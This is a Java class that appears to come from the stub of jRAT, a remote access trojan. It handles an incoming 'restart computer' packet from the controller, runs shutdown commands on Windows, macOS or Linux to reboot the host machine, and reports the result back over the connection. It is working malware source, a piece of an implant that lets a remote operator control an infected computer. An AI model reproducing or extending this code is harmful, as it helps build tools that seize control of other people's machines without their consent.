package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Constants;

import com.redpois0n.common.OperatingSystem;

public class Packet29RestartComputer extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe -r");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
			Runtime.getRuntime().exec("shutdown -r now");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else {
			
			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
